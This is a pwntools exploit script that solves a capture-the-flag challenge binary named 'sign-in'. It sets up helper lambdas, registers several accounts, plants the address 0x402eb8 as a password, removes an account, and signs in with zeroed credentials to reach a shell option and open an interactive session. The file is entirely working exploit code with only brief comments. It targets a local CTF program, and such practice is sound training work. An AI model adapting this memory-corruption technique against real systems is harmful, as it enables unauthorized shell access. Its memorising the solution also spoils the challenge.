#!/usr/bin/env python3
from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
#exe = ELF('sign-in')
conn = process('./sign-in')
#gdb.attach(conn, "b *sign_up+4")

# DownUnder had these lambda's on their github and I thought it looked clean. 
sla  = lambda r, s: conn.sendlineafter(r, s)
sl   = lambda    s: conn.sendline(s)
sa   = lambda r, s: conn.sendafter(r, s)
se   = lambda s: conn.send(s)
ru   = lambda r, **kwargs: conn.recvuntil(r, **kwargs)
rl   = lambda : conn.recvline()
uu32 = lambda d: u32(d.ljust(4, b'\x00'))
uu64 = lambda d: u64(d.ljust(8, b'\x00'))

# Had it written using sendlines and sendafter for everything and the code
# looked... yeah. Got this idea from DownUnder's solution writeup on their 
# github. 
def sign_up(usr, pswd):
    sla(b'> ', b'1')
    sa(b'username: ', usr)
    sa(b'password: ', pswd)

def sign_in(usr, pswd):
    sla(b'> ', b'2')
    sa(b'username: ', usr)
    sa(b'password: ', pswd)

def remove_account():
    sla(b'> ', b'3')

def get_shell():
    sla(b'> ', b'4')
# --------------------------------------------------------------- much cleaner

zero_ptr = 0x402eb8

# Created lots of users to fully understand how this code & vulnerability 
# worked.
sign_up(b'arlo', p64(0x1337))
sign_up(b'ollie', p64(0x1337))
sign_up(b'till', p64(0x1337))
sign_up(b'ritto', p64(0x1337))
sign_up(b't.out', p64(zero_ptr))
sign_in(b't.out', p64(zero_ptr))
remove_account()
sign_up(b'x', b'x')
sign_in(p64(0), p64(0))
get_shell()

conn.interactive()
